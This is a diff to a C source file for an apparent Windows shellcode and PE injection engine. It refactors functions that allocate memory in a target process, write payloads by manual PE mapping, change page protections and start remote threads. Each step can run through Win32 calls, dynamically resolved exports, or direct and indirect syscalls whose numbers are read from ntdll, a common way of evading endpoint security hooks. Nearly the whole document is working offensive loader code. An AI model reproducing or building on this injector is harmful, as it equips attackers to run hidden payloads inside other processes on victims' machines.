@@ -2,17 +2,25 @@
 #include "ps-utils.h"
 #include "peb-eat-utils.h"
 #include "syscall-utils.h"
+#include "resolver.h"
 
 #include <stdio.h>
 
 static LOCAL_LOADER_CONTEXT g_EnvContext = { 0 };
 
-// DFR function pointers (kernel32)
+/*// DFR function pointers (kernel32)
 static P_VirtualAllocEx      g_VirtualAllocEx      = NULL;
 static P_VirtualProtectEx    g_VirtualProtectEx    = NULL;
 static P_WriteProcessMemory  g_WriteProcessMemory  = NULL;
 static P_CreateRemoteThread  g_CreateRemoteThread  = NULL;
-static P_WaitForSingleObject g_WaitForSingleObject = NULL;
+static P_WaitForSingleObject g_WaitForSingleObject = NULL;*/
+
+P_VirtualAllocEx      g_VirtualAllocEx      = NULL;
+P_VirtualProtect      g_VirtualProtect      = NULL;
+P_VirtualProtectEx    g_VirtualProtectEx    = NULL;
+P_WriteProcessMemory  g_WriteProcessMemory  = NULL;
+P_CreateRemoteThread  g_CreateRemoteThread  = NULL;
+P_WaitForSingleObject g_WaitForSingleObject = NULL;
 
 // indirect syscall SSNs
 DWORD    wNtAllocateVirtualMemorySSN      = 0;
@@ -52,102 +60,161 @@ static BOOL IsPayloadPE(LPCVOID pPayload) {
     return TRUE;
 }
 
-BOOL ManualMapWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor) {
-    if (!ctx || !pPayload || ctx->pRemoteAddress == NULL) return FALSE;
+static BOOL WriteBufferFlavorAware(PINJECTION_CONTEXT ctx,
+                                   PBYTE dest,
+                                   PBYTE src,
+                                   SIZE_T size)
+{
+    SIZE_T written = 0;
+
+    // Local process → memcpy
+    if (ctx->hProcess == (HANDLE)-1)
+    {
+        __try {
+            memcpy(dest, src, size);
+            return TRUE;
+        } __except (EXCEPTION_EXECUTE_HANDLER) {
+            return FALSE;
+        }
+    }
+
+    // Remote process → flavor-aware
+    switch (ctx->writeFlavor)
+    {
+        case FLAVOR_WIN32:
+            return WriteProcessMemory(ctx->hProcess,
+                                      dest,
+                                      src,
+                                      size,
+                                      &written);
+
+        case FLAVOR_DFR:
+            if (!g_WriteProcessMemory)
+                return FALSE;
+            return g_WriteProcessMemory(ctx->hProcess,
+                                        dest,
+                                        src,
+                                        size,
+                                        &written);
+
+        case FLAVOR_DIRECT: {
+            NTSTATUS status = SysNtWriteVirtualMemory(ctx->hProcess,
+                                                      dest,
+                                                      src,
+                                                      size,
+                                                      &written);
+            return (status == 0 && written == size);
+        }
+
+        case FLAVOR_INDIRECT: {
+            NTSTATUS status = IndirectSysNtWriteVirtualMemory(ctx->hProcess,
+                                                              dest,
+                                                              src,
+                                                              size,
+                                                              &written);
+            return (status == 0 && written == size);
+        }
+
+        default:
+            return FALSE;
+    }
+}
+
+//
+// Flavor-aware ManualMapWrite (pure C)
+//
+BOOL ManualMapWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload)
+{
+    if (!ctx || !pPayload || ctx->pRemoteAddress == NULL)
+        return FALSE;
 
     PBYTE pRaw  = (PBYTE)pPayload;
     PBYTE pDest = (PBYTE)ctx->pRemoteAddress;
 
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pRaw;
-    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
+    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
+        return FALSE;
 
     PIMAGE_NT_HEADERS pNtHeaders =
         (PIMAGE_NT_HEADERS)(pRaw + pDosHeader->e_lfanew);
-    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
+    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
+        return FALSE;
 
-    // 2. Write headers
-    if (ctx->hProcess == (HANDLE)-1) {
-        __try {
-            memcpy(pDest, pRaw, pNtHeaders->OptionalHeader.SizeOfHeaders);
-        } __except (EXCEPTION_EXECUTE_HANDLER) {
-            return FALSE;
-        }
-    } else {
-        SIZE_T written = 0;
-        if (!WriteProcessMemory(ctx->hProcess,
+    //
+    // 1. Write PE headers
+    //
+    if (!WriteBufferFlavorAware(ctx,
                                 pDest,
                                 pRaw,
-                                pNtHeaders->OptionalHeader.SizeOfHeaders,
-                                &written)) {
-            return FALSE;
-        }
-    }
+                                pNtHeaders->OptionalHeader.SizeOfHeaders))
+        return FALSE;
 
-    // 3. Sections
+    //
+    // 2. Write sections
+    //
     PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
-    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
-        if (pSection[i].SizeOfRawData == 0) continue;
+    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
+    {
+        if (pSection[i].SizeOfRawData == 0)
+            continue;
 
         PBYTE pSectionDest = pDest + pSection[i].VirtualAddress;
         PBYTE pSectionSrc  = pRaw  + pSection[i].PointerToRawData;
 
-        if (ctx->hProcess == (HANDLE)-1) {
-            __try {
-                memcpy(pSectionDest, pSectionSrc, pSection[i].SizeOfRawData);
-            } __except (EXCEPTION_EXECUTE_HANDLER) {
-                return FALSE;
-            }
-        } else {
-            SIZE_T written = 0;
-            if (!WriteProcessMemory(ctx->hProcess,
+        if (!WriteBufferFlavorAware(ctx,
                                     pSectionDest,
                                     pSectionSrc,
-                                    pSection[i].SizeOfRawData,
-                                    &written)) {
-                return FALSE;
-            }
-        }
+                                    pSection[i].SizeOfRawData))
+            return FALSE;
     }
 
-    // 4. Relocations (local only)
-    ULONG_PTR delta = (ULONG_PTR)pDest - pNtHeaders->OptionalHeader.ImageBase;
-    if (delta != 0) {
-        IMAGE_DATA_DIRECTORY relocDir =
-            pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    //
+    // 3. Relocations (local only)
+    //
+    if (ctx->hProcess == (HANDLE)-1)
+    {
+        ULONG_PTR delta = (ULONG_PTR)pDest - pNtHeaders->OptionalHeader.ImageBase;
 
-        if (relocDir.VirtualAddress != 0 &&
-            relocDir.Size > 0 &&
-            ctx->hProcess == (HANDLE)-1) {
+        if (delta != 0)
+        {
+            IMAGE_DATA_DIRECTORY relocDir =
+                pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
-            PIMAGE_BASE_RELOCATION pRelocBlock =
-                (PIMAGE_BASE_RELOCATION)(pDest + relocDir.VirtualAddress);
+            if (relocDir.VirtualAddress != 0 &&
+                relocDir.Size > 0)
+            {
+                PIMAGE_BASE_RELOCATION pRelocBlock =
+                    (PIMAGE_BASE_RELOCATION)(pDest + relocDir.VirtualAddress);
 
-            while (pRelocBlock->VirtualAddress != 0 &&
-                   pRelocBlock->SizeOfBlock > 0) {
+                while (pRelocBlock->VirtualAddress != 0 &&
+                       pRelocBlock->SizeOfBlock > 0)
+                {
+                    DWORD entryCount =
+                        (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
+                        sizeof(WORD);
 
-                DWORD entryCount =
-                    (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
-                    sizeof(WORD);
+                    PWORD pEntries =
+                        (PWORD)((PBYTE)pRelocBlock + sizeof(IMAGE_BASE_RELOCATION));
 
-                PWORD pEntries =
-                    (PWORD)((PBYTE)pRelocBlock + sizeof(IMAGE_BASE_RELOCATION));
+                    for (DWORD i = 0; i < entryCount; i++)
+                    {
+                        WORD type   = pEntries[i] >> 12;
+                        WORD offset = pEntries[i] & 0x0FFF;
 
-                for (DWORD i = 0; i < entryCount; i++) {
-                    WORD type   = pEntries[i] >> 12;
-                    WORD offset = pEntries[i] & 0x0FFF;
-
-                    if (type == RELOC_TYPE) {
-                        ULONG_PTR *pPatchTarget =
-                            (ULONG_PTR *)(pDest +
-                                          pRelocBlock->VirtualAddress +
-                                          offset);
-                        *pPatchTarget += delta;
+                        if (type == RELOC_TYPE)
+                        {
+                            ULONG_PTR *pPatchTarget =
+                                (ULONG_PTR *)(pDest +
+                                              pRelocBlock->VirtualAddress +
+                                              offset);
+                            *pPatchTarget += delta;
+                        }
                     }
-                }
 
-                pRelocBlock =
-                    (PIMAGE_BASE_RELOCATION)((PBYTE)pRelocBlock +
-                                             pRelocBlock->SizeOfBlock);
+                    pRelocBlock =
+                        (PIMAGE_BASE_RELOCATION)((PBYTE)pRelocBlock +
+                                                 pRelocBlock->SizeOfBlock);
+                }
             }
         }
     }
@@ -155,10 +222,40 @@ BOOL ManualMapWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR fla
     return TRUE;
 }
 
-BOOL InitializeResolvers(SYSCALL_FLAVOR flavor) {
-    if (flavor == FLAVOR_DFR) {
+BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
+{
+    BOOL needDFR      = FALSE;
+    BOOL needIndirect = FALSE;
+
+    //
+    // Determine which resolver types are needed based on per-stage flavors
+    //
+    if (ctx->allocFlavor   == FLAVOR_DFR ||
+        ctx->writeFlavor   == FLAVOR_DFR ||
+        ctx->protectFlavor == FLAVOR_DFR ||
+        ctx->invokeFlavor  == FLAVOR_DFR)
+    {
+        needDFR = TRUE;
+    }
+
+    if (ctx->allocFlavor   == FLAVOR_INDIRECT ||
+        ctx->writeFlavor   == FLAVOR_INDIRECT ||
+        ctx->protectFlavor == FLAVOR_INDIRECT ||
+        ctx->invokeFlavor  == FLAVOR_INDIRECT)
+    {
+        needIndirect = TRUE;
+    }
+
+    //
+    // Initialize DFR resolver (kernel32 exports)
+    //
+    if (needDFR)
+    {
+        printf("[*] Initializing DFR resolver...\n");
+
         HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-        if (!hKernel32) {
+        if (!hKernel32)
+        {
             printf("[ERROR] Failed to get kernel32.dll\n");
             return FALSE;
         }
@@ -167,6 +264,8 @@ BOOL InitializeResolvers(SYSCALL_FLAVOR flavor) {
             (P_VirtualAllocEx)GPAManualByName(hKernel32, "VirtualAllocEx");
         g_WriteProcessMemory =
             (P_WriteProcessMemory)GPAManualByName(hKernel32, "WriteProcessMemory");
+        g_VirtualProtect =
+            (P_VirtualProtect)GPAManualByName(hKernel32, "VirtualProtect");
         g_VirtualProtectEx =
             (P_VirtualProtectEx)GPAManualByName(hKernel32, "VirtualProtectEx");
         g_CreateRemoteThread =
@@ -175,15 +274,23 @@ BOOL InitializeResolvers(SYSCALL_FLAVOR flavor) {
             (P_WaitForSingleObject)GPAManualByName(hKernel32, "WaitForSingleObject");
 
         if (!g_VirtualAllocEx || !g_WriteProcessMemory ||
-            !g_VirtualProtectEx || !g_CreateRemoteThread || !g_WaitForSingleObject) {
+            !g_VirtualProtect || !g_VirtualProtectEx || 
+            !g_CreateRemoteThread || !g_WaitForSingleObject)
+        {
             printf("[ERROR] DFR resolver failed.\n");
             return FALSE;
         }
 
-        return TRUE;
+        printf("[+] DFR resolver initialized.\n");
     }
 
-    if (flavor == FLAVOR_INDIRECT) {
+    //
+    // Initialize Indirect resolver (SSNs + syscall addresses)
+    //
+    if (needIndirect)
+    {
+        printf("[*] Initializing Indirect resolver...\n");
+
 #if defined(_WIN64)
         PPEB pPeb = (PPEB)__readgsqword(0x60);
 #else
@@ -191,27 +298,24 @@ BOOL InitializeResolvers(SYSCALL_FLAVOR flavor) {
 #endif
 
         g_EnvContext.wNtAllocateVirtualMemorySSN = GetSSNByName(pPeb, "NtAllocateVirtualMemory");
-        g_EnvContext.wNtProtectVirtualMemorySSN = GetSSNByName(pPeb, "NtProtectVirtualMemory");
-        g_EnvContext.wNtWriteVirtualMemorySSN = GetSSNByName(pPeb, "NtWriteVirtualMemory");
+        g_EnvContext.wNtProtectVirtualMemorySSN  = GetSSNByName(pPeb, "NtProtectVirtualMemory");
+        g_EnvContext.wNtWriteVirtualMemorySSN    = GetSSNByName(pPeb, "NtWriteVirtualMemory");
 
         printf("[+] Indirect SSNs loaded.\n");
 
         HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-        printf("[+] Resolving addresses.\n");
-        if (hNtdll) {
-            g_EnvContext.sysAddrNtAllocateVirtualMemory =
-                (UINT_PTR)GetSyscallAddress(
-                    GPAManualByName(hNtdll, "NtAllocateVirtualMemory"));
-            g_EnvContext.sysAddrNtProtectVirtualMemory =
-                (UINT_PTR)GetSyscallAddress(
-                    GPAManualByName(hNtdll, "NtProtectVirtualMemory"));
-            g_EnvContext.sysAddrNtWriteVirtualMemory =
-                (UINT_PTR)GetSyscallAddress(
-                    GPAManualByName(hNtdll, "NtWriteVirtualMemory"));
-        } else {
-            printf("[!] ERROR: Failed to resolve addresses.\n");
+        if (!hNtdll)
+        {
+            printf("[ERROR] Failed to resolve ntdll.dll\n");
+            return FALSE;
         }
-        printf("[+] Done resolving addresses.\n");
+
+        g_EnvContext.sysAddrNtAllocateVirtualMemory =
+            (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtAllocateVirtualMemory"));
+        g_EnvContext.sysAddrNtProtectVirtualMemory =
+            (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtProtectVirtualMemory"));
+        g_EnvContext.sysAddrNtWriteVirtualMemory =
+            (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWriteVirtualMemory"));
 
         // Bridge values into globals used by indirect-syscalls.asm
         wNtAllocateVirtualMemorySSN    = g_EnvContext.wNtAllocateVirtualMemorySSN;
@@ -222,7 +326,7 @@ BOOL InitializeResolvers(SYSCALL_FLAVOR flavor) {
         sysAddrNtProtectVirtualMemory  = g_EnvContext.sysAddrNtProtectVirtualMemory;
         sysAddrNtWriteVirtualMemory    = g_EnvContext.sysAddrNtWriteVirtualMemory;
 
-        // Additional indirect syscalls your ASM expects
+        // Additional indirect syscalls
         wNtCreateThreadExSSN           = GetSSNByName(pPeb, "NtCreateThreadEx");
         wNtWaitForSingleObjectSSN      = GetSSNByName(pPeb, "NtWaitForSingleObject");
         wNtQueueApcThreadSSN           = GetSSNByName(pPeb, "NtQueueApcThread");
@@ -233,10 +337,9 @@ BOOL InitializeResolvers(SYSCALL_FLAVOR flavor) {
         sysAddrNtQueueApcThread        = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtQueueApcThread"));
         sysAddrNtResumeThread          = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtResumeThread"));
 
+        printf("[+] Indirect resolver initialized.\n");
         printf("[+] SSNs Loaded: NtAllocateVirtualMemory(0x%X), NtWriteVirtualMemory(0x%X), NtProtectVirtualMemory(0x%X), NtCreateThreadEx(0x%X), NtWaitForSingleObject(0x%X)\n",
-            wNtAllocateVirtualMemorySSN, wNtWriteVirtualMemorySSN, wNtProtectVirtualMemorySSN, wNtCreateThreadExSSN, wNtWaitForSingleObjectSSN);
-
-        return TRUE;
+            wNtAllocateVirtualMemorySSN, wNtWriteVirtualMemorySSN, wNtProtectVirtualMemorySSN, wNtCreateThreadExSSN, wNtWaitForSingleObjectSSN);        
     }
 
     return TRUE;
@@ -312,289 +415,34 @@ BOOL InitializeTarget(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
     return ctx->hProcess != NULL;
 }
 
-BOOL DefaultAllocate(PINJECTION_CONTEXT ctx, DWORD protect, SYSCALL_FLAVOR flavor) {
-    if (flavor == FLAVOR_WIN32) {
-        if (ctx->hProcess == (HANDLE)-1)
-            ctx->pRemoteAddress = VirtualAlloc(NULL,
-                                               ctx->payloadSize,
-                                               MEM_COMMIT | MEM_RESERVE,
-                                               protect);
-        else
-            ctx->pRemoteAddress = VirtualAllocEx(ctx->hProcess,
-                                                 NULL,
-                                                 ctx->payloadSize,
-                                                 MEM_COMMIT | MEM_RESERVE,
-                                                 protect);
-        return ctx->pRemoteAddress != NULL;
+char* flavorName(SYSCALL_FLAVOR f)
+{
+    switch (f) {
+        case FLAVOR_WIN32:    return "WIN32";
+        case FLAVOR_DFR:      return "DFR";
+        case FLAVOR_DIRECT:   return "DIRECT";
+        case FLAVOR_INDIRECT: return "INDIRECT";
+        default:              return "UNKNOWN";
     }
-
-    if (flavor == FLAVOR_DFR) {
-        if (!g_VirtualAllocEx) return FALSE;
-        ctx->pRemoteAddress = g_VirtualAllocEx(ctx->hProcess,
-                                               NULL,
-                                               ctx->payloadSize,
-                                               MEM_COMMIT | MEM_RESERVE,
-                                               protect);
-        return ctx->pRemoteAddress != NULL;
-    }
-
-    if (flavor == FLAVOR_DIRECT) {
-        PVOID baseAddr = NULL;
-        SIZE_T regionSize = ctx->payloadSize;
-        NTSTATUS status = SysNtAllocateVirtualMemory(ctx->hProcess,
-                                                     &baseAddr,
-                                                     0,
-                                                     &regionSize,
-                                                     MEM_COMMIT | MEM_RESERVE,
-                                                     protect);
-        if (status == 0) {
-            ctx->pRemoteAddress = baseAddr;
-            return TRUE;
-        }
-        return FALSE;
-    }
-
-    if (flavor == FLAVOR_INDIRECT) {
-        printf("[*] Running Allocation with Indirect API calls.\n");
-        NTSTATUS status = IndirectSysNtAllocateVirtualMemory(
-            ctx->hProcess,
-            &ctx->pRemoteAddress,
-            0,
-            &ctx->payloadSize,
-            MEM_COMMIT | MEM_RESERVE,
-            protect);
-        printf("[*] Done running Indirect API allocation.\n");
-        return (status == 0);
-    }
-
-    return FALSE;
-}
-
-BOOL DefaultProtect(PINJECTION_CONTEXT ctx,
-                    DWORD targetProtect,
-                    PDWORD pOldProtect,
-                    SYSCALL_FLAVOR flavor) {
-    if (flavor == FLAVOR_WIN32) {
-        if (ctx->hProcess == (HANDLE)-1)
-            return VirtualProtect(ctx->pRemoteAddress,
-                                  ctx->payloadSize,
-                                  targetProtect,
-                                  pOldProtect);
-        else
-            return VirtualProtectEx(ctx->hProcess,
-                                    ctx->pRemoteAddress,
-                                    ctx->payloadSize,
-                                    targetProtect,
-                                    pOldProtect);
-    }
-
-    if (flavor == FLAVOR_DFR) {
-        if (!g_VirtualProtectEx) return FALSE;
-        return g_VirtualProtectEx(ctx->hProcess,
-                                  ctx->pRemoteAddress,
-                                  ctx->payloadSize,
-                                  targetProtect,
-                                  pOldProtect);
-    }
-
-    if (flavor == FLAVOR_DIRECT) {
-        ULONG oldProt = 0;
-        PVOID baseAddr = ctx->pRemoteAddress;
-        SIZE_T regionSize = ctx->payloadSize;
-        NTSTATUS status = SysNtProtectVirtualMemory(ctx->hProcess,
-                                                    &baseAddr,
-                                                    &regionSize,
-                                                    targetProtect,
-                                                    &oldProt);
-        if (pOldProtect) *pOldProtect = oldProt;
-        return (status == 0);
-    }
-
-    if (flavor == FLAVOR_INDIRECT) {
-        ULONG oldProt = 0;
-        PVOID baseAddr = ctx->pRemoteAddress;
-        SIZE_T regionSize = ctx->payloadSize;
-        NTSTATUS status = IndirectSysNtProtectVirtualMemory(ctx->hProcess,
-                                                            &baseAddr,
-                                                            &regionSize,
-                                                            targetProtect,
-                                                            &oldProt);
-        if (pOldProtect) *pOldProtect = oldProt;
-        return (status == 0);
-    }
-
-    return FALSE;
-}
-
-BOOL DefaultWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload, SYSCALL_FLAVOR flavor) {
-    if (ctx->hProcess == (HANDLE)-1) {
-        __try {
-            memcpy(ctx->pRemoteAddress, pPayload, ctx->payloadSize);
-            return TRUE;
-        } __except (EXCEPTION_EXECUTE_HANDLER) {
-            return FALSE;
-        }
-    }
-
-    if (flavor == FLAVOR_WIN32) {
-        return WriteProcessMemory(ctx->hProcess,
-                                  ctx->pRemoteAddress,
-                                  (PVOID)pPayload,
-                                  ctx->payloadSize,
-                                  NULL);
-    }
-
-    if (flavor == FLAVOR_DFR) {
-        if (!g_WriteProcessMemory) return FALSE;
-        return g_WriteProcessMemory(ctx->hProcess,
-                                    ctx->pRemoteAddress,
-                                    (PVOID)pPayload,
-                                    ctx->payloadSize,
-                                    NULL);
-    }
-
-    if (flavor == FLAVOR_DIRECT) {
-        ULONG oldProt = 0;
-        DefaultProtect(ctx, PAGE_EXECUTE_READWRITE, &oldProt, flavor);
-
-        SIZE_T bytesWritten = 0;
-        NTSTATUS status = SysNtWriteVirtualMemory(ctx->hProcess,
-                                                  ctx->pRemoteAddress,
-                                                  (PVOID)pPayload,
-                                                  ctx->payloadSize,
-                                                  &bytesWritten);
-        if (status != 0) return FALSE;
-
-        ULONG tmp = 0;
-        DefaultProtect(ctx, oldProt, &tmp, flavor);
-        return (bytesWritten > 0);
-    }
-
-    if (flavor == FLAVOR_INDIRECT) {
-        SIZE_T bytesWritten = 0;
-        NTSTATUS status = IndirectSysNtWriteVirtualMemory(ctx->hProcess,
-                                                          ctx->pRemoteAddress,
-                                                          (PVOID)pPayload,
-                                                          ctx->payloadSize,
-                                                          &bytesWritten);
-        return (status == 0 && bytesWritten > 0);
-    }
-
-    return FALSE;
-}
-
-BOOL DefaultInvoke(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
-    if (ctx->enableStomping == FALSE) {
-        DWORD oldProtect = 0;
-        if (!DefaultProtect(ctx, PAGE_EXECUTE_READ, &oldProtect, flavor))
-            return FALSE;
-    }
-
-    if (ctx->hProcess == (HANDLE)-1) {
-        typedef void (*FnEntry)();
-        FnEntry entry = (FnEntry)ctx->pRemoteAddress;
-        entry();
-        return TRUE;
-    }
-
-    if (flavor == FLAVOR_WIN32) {
-        HANDLE hThread = CreateRemoteThread(ctx->hProcess,
-                                            NULL,
-                                            0,
-                                            (LPTHREAD_START_ROUTINE)ctx->pRemoteAddress,
-                                            NULL,
-                                            0,
-                                            NULL);
-        ctx->hThread = hThread;
-        return (hThread != NULL);
-    }
-
-    if (flavor == FLAVOR_DFR) {
-        printf("[*] Using direct syscalls to invoke NtCreateThreadEx.\n");
-        if (!g_CreateRemoteThread) return FALSE;
-        HANDLE hThread = g_CreateRemoteThread(ctx->hProcess,
-                                              NULL,
-                                              0,
-                                              (LPTHREAD_START_ROUTINE)ctx->pRemoteAddress,
-                                              NULL,
-                                              0,
-                                              NULL);
-        ctx->hThread = hThread;
-        return (hThread != NULL);
-    }
-
-    if (flavor == FLAVOR_DIRECT) {
-        printf("[*] Using direct syscalls to invoke NtCreateThreadEx.\n");
-        NTSTATUS status = SysNtCreateThreadEx(&ctx->hThread,
-                                              GENERIC_EXECUTE,
-                                              NULL,
-                                              ctx->hProcess,
-                                              ctx->pRemoteAddress,
-                                              NULL,
-                                              FALSE,
-                                              0,
-                                              0,
-                                              0,
-                                              NULL);
-        return (status == 0 && ctx->hThread != NULL);
-    }
-
-    if (flavor == FLAVOR_INDIRECT) {
-        printf("[*] Using indirect syscalls to invoke NtCreateThreadEx.\n");
-        NTSTATUS status = IndirectSysNtCreateThreadEx(&ctx->hThread,
-                                                      GENERIC_EXECUTE,
-                                                      NULL,
-                                                      ctx->hProcess,
-                                                      ctx->pRemoteAddress,
-                                                      NULL,
-                                                      FALSE,
-                                                      0,
-                                                      0,
-                                                      0,
-                                                      NULL);
-        return (status == 0 && ctx->hThread != NULL);
-    }
-
-    return FALSE;
 }
 
 BOOL EngineExecute(PINJECTION_ENGINE engine,
                    PINJECTION_CONTEXT ctx,
                    LPCVOID pPayload,
-                   SYSCALL_FLAVOR flavor,
-                   DWORD finalProtect) {
-    if (!engine ||
-        !engine->Allocate ||
-        !engine->Write ||
-        !engine->Protect ||
-        !engine->Invoke)
-        return FALSE;
+                   DWORD finalProtect)
+{
+    InitializeTarget(ctx, ctx->allocFlavor);
+    InitializeResolvers(ctx);
 
-    printf("[*] Initializing target.\n");
-    if (!InitializeTarget(ctx, flavor))
-        return FALSE;
+    engine->Allocate(ctx, PAGE_READWRITE);
 
-    printf("[*] Initializing resolvers.\n");
-    if (flavor == FLAVOR_DFR || flavor == FLAVOR_INDIRECT)
-        if (!InitializeResolvers(flavor))
-            return FALSE;
-    printf("[*] Resolver initialization complete.\n");
+    if (IsPayloadPE(pPayload))
+        ManualMapWrite(ctx, pPayload);
+    else
+        engine->Write(ctx, pPayload);
 
-    printf("[*] Running Allocation.\n");
-    if (!engine->Allocate(ctx, PAGE_READWRITE, flavor))
-        return FALSE;
+    DWORD oldProt = 0;
+    engine->Protect(ctx, finalProtect, &oldProt);
 
-    printf("[*] Allocation complete.\n");
-    if (IsPayloadPE(pPayload)) {
-        printf("[*] Detected PE payload, using ManualMapWrite.\n");
-        if (!ManualMapWrite(ctx, pPayload, flavor))
-            return FALSE;
-    } else {
-        printf("[*] Detected raw payload, using DefaultWrite.\n");
-        if (!engine->Write(ctx, pPayload, flavor))
-            return FALSE;
-    }
-
-    printf("[*] Running Invoke.\n");
-    return engine->Invoke(ctx, flavor);
+    return engine->Invoke(ctx);
 }
